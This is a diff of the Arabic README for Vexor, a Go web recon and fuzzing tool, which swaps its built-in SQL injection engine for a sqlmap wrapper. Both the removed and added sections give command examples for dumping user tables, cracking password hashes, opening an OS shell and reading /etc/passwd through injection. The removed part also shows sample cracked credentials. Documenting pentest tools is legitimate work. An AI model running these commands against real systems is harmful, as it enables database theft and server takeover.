@@ -7,7 +7,7 @@
    ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
 ```
 
-**أداة أمنية هجومية عالية الأداء مكتوبة بلغة Go**
+**أداة استطلااف و fuzzing عالية الأداء مكتوبة بلغة Go**
 
 [ العربية (Arabic) ] | [ English ](README.md)
 
@@ -16,8 +16,9 @@
 [![OS](https://img.shields.io/badge/OS-Linux%20%7C%20macOS%20%7C%20Windows-brightgreen?style=flat-square)](https://github.com/0xseif-code/vexor/releases)
 [![Release](https://img.shields.io/badge/Version-1.0.0-orange?style=flat-square)](https://github.com/0xseif-code/vexor/releases)
 
-Vexor أداة هجومية في ملف واحد (single binary) لاستكشاف الويب واختبار حقن SQL.
+Vexor أداة في ملف واحد (single binary) لاستكشاف الويب و fuzzing.
 لا تبعيات خارجية ولا شوائب — ملف واحد وقوائم كلمات وهدف، كفى.
+اختبار حقن SQLيتم عبر sqlmap.
 
 ```bash
 # تثبيت سريع
@@ -33,8 +34,7 @@ go install github.com/0xseif-code/vexor/cmd/vexor@latest
 | 🔍 **Subdomain** | استطلاع النطاقات الفرعية | Worker-Pool لنشاط DNS + crt.sh السلبي |
 | 📁 **Directory** | اكتشاف المسارات والملفات | فحص تعاودي + تصفية ذكية عبر Baseline |
 | 🎯 **Fuzzing** | تعدين الباراميترات | علامات `FUZZ` متعددة المواضع + تحليل الاستجابة |
-| 💉 **SQLi** | استغلال الثغرات | 7 تقنيات كشف + تجاوز الـ WAF + سرد/تفريغ آلي + كسر الهاشات |
-| 🔑 **Hash Crack** | استعادة كلمات المرور دون اتصال | محدّد نوع تلقائي + عامل عامل داخل Dictionary Worker-Pool |
+| 💉 **SQLi** | اختبار حقن SQL | غلاف لـ sqlmap (المعيار الصناعي) |
 | 💬 **Interactive UX** | تشغيل موجّه | محرّك أسئلة مع واعي للـ batch + تقدّم حي + ملخّص قياسات |
 | 📚 **Wordlists** | إدارة قوائم الكلمات | تنزيل تلقائي من SecLists حسب الطلب (`~/.vexor/`) |
 
@@ -226,137 +226,74 @@ $ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-st
 [+] fuzzing complete: 3 hits, 1411/1411 checked, 0 errors in 41.7s
 ```
 
-### `sqli` — كشف واستغلال حقن SQL
+### `sqli` — اختبار حقن SQL
 
-سبع تقنيات كشف عبر كل الباراميترات — boolean, error, time, union, stacked,
-inline, OOB — ثم استغلال كامل على أول نقطة مؤكَّدة. الاستغلال شبه آلي:
-`-D ... -T ... --dump` يتنقّل بذاته بين قواعد البيانات ← الجداول ← الأعمدة،
-ويمكن كسر هاشات كلمات المرور المكتشفة دون اتصال عبر قاموس مدمج.
+`vexor sqli` هو غلاف لـ sqlmap — أداة حقن SQLالمعيارية في الصناعة.
+Vexor لا يزوّد بمحرّك SQLi خاص به.
 
-الكشف موجَّه بمصفوفة حمولات مراعية لإصدار قاعدة البيانات — أكثر من 330 قالبًا
-أصليًا تغطي MySQL وPostgreSQL وMSSQL وOracle وSQLite ونطاقًا عامًا عبر كل
-عائلات التقنيات السبع. يختار `--level` (1-5) دقة الحمولة و`--risk` (1-3)
-يستبعد الحمولات التخريبية؛ و`--dbms` يضيّق المجموعة على قاعدة بيانات واحدة.
-يُوسَّع كل قالب أساسي عبر محرك لفّات يعتمد المستوى (اختلافات علامات الاقتباس،
-الأقواس، سياقات الجملة، اقتطاع NUL، تحويرات الكلمات المفتاحية/المسافات) فينتج
-كل قالب عشرات الاستقصاءات. شغّل `vexor sqli --matrix` لعرض ملخص التغطية
-لكل قاعدة بيانات وتقنية.
+**لماذا sqlmap:**
+- أداة مُجربة في آلاف الاختبارات
+- تدعم كل قواعد البيانات والتقنيات وأنماط الحقن
+- Vexor يركّز على ما يُتقنه: الاستطلااف والـ fuzzing
 
-**سلوك العُمق.** يُنمي `--level` مجموعة الحمولات المختارة ولفّاتها معًا:
-المستوى 1 يختبر فقط المجموعة الفرعية الأعلى احتمالًا (~15-25 استقصاءًا لكل نقطة)؛
-المستوى 3 يوسّع إلى المصفوفة الكاملة عبر كل فروع الإصدارات والسياقات (أكثر من 100
-استقصاء)؛ والمستويان 4-5 يضيفان تحويرات مدمجة للكلمات/المسافات تزيد التهرب.
-يقوم `--risk` ببوّابة الحمولات التخريبية — المستوى 1 يستبعد الحمولات المرصوصة/
-خارج النطاق/الثقيلة كلما وُجد بديل أخفّ، بينما المستوى 3 يسمح بمنطق OR والمرصوصة والثقيلة.
+**المتطلبات:** يجب تثبيت sqlmap وإتاحته على PATH.
 
 ```bash
-# عُمق معتدل: المصفوفة الكاملة دون حمولات تخريبية
-vexor sqli -u "https://example.com/page?id=1" --level 3 --risk 1
-
-# أقصى عُمق + حمولات عدوانية (مرصوصة / خارج النطاق / ثقيلة)
-vexor sqli -u "https://example.com/page?id=1" --level 5 --risk 3 --oob-domain "att.d"
+# تثبيت sqlmap
+sudo apt install sqlmap          # Debian/Kali
+sudo pacman -S sqlmap            # Arch
+pipx install sqlmap              # pipx
 ```
-
-في أهداف MySQL القائمة على الخطأ تُقرأ القيمة مباشرة من أخطاء DBMS المستفزّة
-(`EXTRACTVALUE` / `UPDATEXML` / `GTID_SUBSET` / duplicate-key). وعندما يحجب
-WAF تسريب البيانات بشكلها الخام، يتراجع الاستخراج إلى استعلامات `CASE WHEN`
-شرطية عبر قناة الخطأ ليظل `--dump` يعمل. ويُستكمل اكتشاف الجداول/الأعمدة
-بالبحث دون schema وأعمدة WordPress المعروفة والبروت فورس على الأعمدة الشائعة
-عندما تكون `information_schema` محجوبة.
 
 | العلم | الاختصار | النوع | الوصف | الافتراضي |
 |---|---|---|---|---|
-| `--url` | `-u` | string | الهدف، مثل `https://example.com/page?id=1` | |
+| `--url` | `-u` | string | الهدف | |
 | `--request` | `-r` | string | ملف طلب خام بصيغة Burp | |
 | `--param` | `-p` | string | اختبار باراميتر واحد فقط | |
-| `--technique` | `-t` | string | أكواد التقنيات: `B`,`E`,`U`,`S`,`T`,`I`,`O` (قابلة للدمج مثل `BEU`) أو اسم تقنية | `all` |
-| `--dbms` | | string | فرض قاعدة بيانات: `mysql`, `postgres`, `mssql`, `oracle`, `sqlite` | `auto` |
+| `--database` | `-D` | string | اسم قاعدة البيانات | |
+| `--table` | `-T` | string | اسم الجدول | |
+| `--column` | `-C` | stringslice | أعمدة للتفريغ (قابلة للتكرار) | |
+| `--data` | | string | بيانات POST | |
+| `--cookie` | | string | هيدر الكوكي | |
+| `--headers` | | stringarray | هيدر مخصّص (قابل للتكرار) | |
+| `--proxy` | | string | بروكسي HTTP/SOCKS5 | |
 | `--level` | | int | شدة الاختبار (1-5) | `1` |
 | `--risk` | | int | خطورة الحمولات (1-3) | `1` |
-| `--threads` | | int | سلاسل التزامن | `10` |
-| `--fast` | | bool | فحص سريع: مستوى/خطورة 1 + error وunion فقط | `false` |
-| `--matrix` | | bool | طباعة ملخص مصفوفة الحمولات (العدد حسب قاعدة البيانات/التقنية) ثم الخروج | `false` |
-| `--timeout` | | int | مهلة الطلب (ثوانٍ) | `8` |
-| `--delay` | | int | نوم بين الطلبات (ملي ثانية) | `0` |
-| `--retries` | | int | إعادة المحاولة للطلبات الفاشلة | `1` |
-| `--batch` | | bool | تشغيل غير تفاعلي؛ اختيار الافتراضي لكل سؤال | `false` |
-| `--tamper` | | stringslice | سكربتات Tamper، مثل `space2comment,randomcase` | |
-| `--auto-tamper` | | bool | بصمة الـ WAF + سلسلة Tamper مقترحة | `false` |
-| `--oob-domain` | | string | نطاق لقنوات OOB (DNS/HTTP) | |
+| `--threads` | | int | طلبات متزامنة | `5` |
+| `--technique` | | string | التقنيات: `BEUSTQ` | |
+| `--dbms` | | string | فرض نوع قاعدة البيانات | |
 | `--dbs` | | bool | سرد قواعد البيانات | `false` |
 | `--tables` | | bool | سرد الجداول | `false` |
 | `--columns` | | bool | سرد الأعمدة | `false` |
 | `--dump` | | bool | تفريغ محتويات جدول | `false` |
-| `--database` | `-D` | string | اسم القاعدة لـ `--tables/--columns/--dump` | |
-| `--table` | `-T` | string | اسم الجدول لـ `--columns/--dump` | |
-| `--column` | `-C` | stringslice | أعمدة محدّدة للتفريغ، قابلة للتكرار | |
-| `--crack` | | bool | كسر الهاشات دون سؤال إضافي | `false` |
-| `--no-crack` | | bool | عدم كسر الهاشات نهائيًا | `false` |
-| `--os-shell` | | bool | قشرة نظام تفاعلية عبر نقطة الحقن | `false` |
-| `--read-file` | | string | قراءة ملف من خادم قاعدة البيانات | |
-| `--write-file` | | string | كتابة ملف محلي إلى الخادم | |
-| `--file-dest` | | string | المسار البعيد لـ `--write-file` | اسم الملف |
+| `--current-user` | | bool | سرد مستخدم DBMS الحالي | `false` |
+| `--current-db` | | bool | سرد قاعدة البيانات الحالية | `false` |
+| `--is-dba` | | bool | التحقق من صلاحيات DBA | `false` |
+| `--passwords` | | bool | سرد هاشات كلمات المرور | `false` |
+| `--batch` | | bool | وضع غير تفاعلي | `true` |
+| `--random-agent` | | bool | User-Agent عشوائي | `true` |
+| `--tamper` | | string | سكربت(ات) Tamper | |
+| `--forms` | | bool | تحليل واختبار النماذج | `false` |
+| `--crawl` | | int | عمق الزحف | `0` |
+| `--os-shell` | | bool | قشرة نظام تفاعلية | `false` |
+| `--sql-shell` | | bool | قشرة SQLتفاعلية | `false` |
+| `--extra` | | stringslice | أرقام إضافية تمرّ مباشرة إلى sqlmap | |
 
 ```bash
-# طباعة ملخص مصفوفة الحمولات
-vexor sqli --matrix
+# فحص أساسي
+vexor sqli -u "https://target.com/page?id=1"
 
-# فحص حقن SQL أساسي
-vexor sqli -u "http://target.com/page.php?id=1"
+# سرد قواعد البيانات
+vexor sqli -u "https://target.com/page?id=1" --dbs
 
-# تقنيتا error + union فقط على باراميتر واحد
-vexor sqli -u "http://target.com/page.php?id=1" -p id -t "BEU"
+# تفريغ جدول
+vexor sqli -u "https://target.com/page?id=1" -D shop -T users --dump
 
-# فحص أعمق: المستوى 3 يفتح فروع OR / order-by / having
-vexor sqli -u "http://target.com/page.php?id=1" --level 3 --risk 1
+# من ملف طلب خام
+vexor sqli -r request.txt --dump --batch
 
-# المصفوفة الكاملة: المستوى 5 + خطورة 2 (يضيف متجهات الوقت/الثقيلة)، غير تفاعلي
-vexor sqli -u "http://target.com/page.php?id=1" --level 5 --risk 2 --batch
-
-# فحص آلي + استخراج كامل (قاعدة -> جدول -> أعمدة آليًا)
-vexor sqli -u "http://target.com/page.php?id=1" --auto-tamper --dbs
-
-# تفريغ جدول (يُحلّ اسم الجدول تلقائيًا إذا كان قريبًا)
-vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C id,username,password
-
-# كسر الهاشات بعد التفريغ (أو --batch لرفض الأسئلة)
-vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users --crack
-vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C password --batch
-
-# استحواذ كامل
-vexor sqli -u "http://target.com/page.php?id=1" --os-shell
-vexor sqli -u "http://target.com/page.php?id=1" --read-file /etc/passwd
-```
-
-يُجاب عن الأسئلة التفاعلية (تصفية قاعدة البيانات، Tamper للـ WAF، تركيز
-الباراميتر، حدّ التفريغ الكبير، كسر الهاشات) تلقائيًا بقيم افتراضية معقولة
-عند استخدام `--batch` أو عندما لا يكون stdin طرفية.
-
-```text
-$ vexor sqli -u "https://example.com/page?id=1" --level 2
-[*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=10)
-URL query parameter/GET/id technique=boolean dbms=mysql confidence=95
-URL query parameter/GET/id technique=error   dbms=mysql confidence=88
-POST form parameter/POST/user technique=time      dbms=mysql confidence=76
-...
-[+] scan complete: 3 findings, 412 requests, 2 errors in 2m05s
-[i] fingerprinted DBMS: mysql
-[+] done | requests=412 | elapsed=125.3s | rate=3.3 req/s | phase(detect=125.3s)
-
-$ vexor sqli -u "https://example.com/page?id=1" --dump -D shop -T users --crack
-...
-[i] first confirmed injection point: GET/id (boolean)
-id      username        password
-1       admin           *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
-2       bob             *A4B6157319038726FF3A9A4DFFED4DEB
-...
-[+] dumped 2 rows from shop.users (3 columns)
-[*] cracking 2 hash(es) via default 10k passwords
-[*] Cracking hashes: 1/2 solved (50.0%) | Speed: 312 480 H/s
-[*] Cracking finished: 2/2 hashes solved (100.0%) in 412ms (4 940 attempts)
-shop.users: admin | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 (admin123)
-shop.users: bob | *A4B6157319038726FF3A9A4DFFED4DEB (bob)
-[+] done | requests=88 | elapsed=9.7s | rate=9.1 req/s | phase(detect=5.2s enum=1.6s dump=2.9s)
+# مع tamper ومستوى أعلى
+vexor sqli -u "https://target.com/page?id=1" --tamper=space2comment --level 3
 ```
 
 ### `update` — تحديث الملف الثنائي ذاتيًا
@@ -413,9 +350,6 @@ $ vexor update-wordlists
   `passwords`, `passwords-large`, `endpoints`.
 - **قوائم مخصّصة (`-w /path/to/file.txt`):** أي ملف محلي، كلمة في كل سطر —
   يلغي قالب الحجم.
-- **كسر الهاشات** يستخدم قائمة `passwords` المخزّنة افتراضيًا، أو ملفًا
-  مخصّصًا؛ يحدد المكسّر نوع الهاش (MD5, SHA-1, bcrypt, ...) ثم يبثّ القاموس
-  عبر حوض عاملين، لذلك لا تُحمَّل القوائم الكبيرة في الذاكرة كاملة.
 
 صيغ المخرجات حسب الفحص:
 
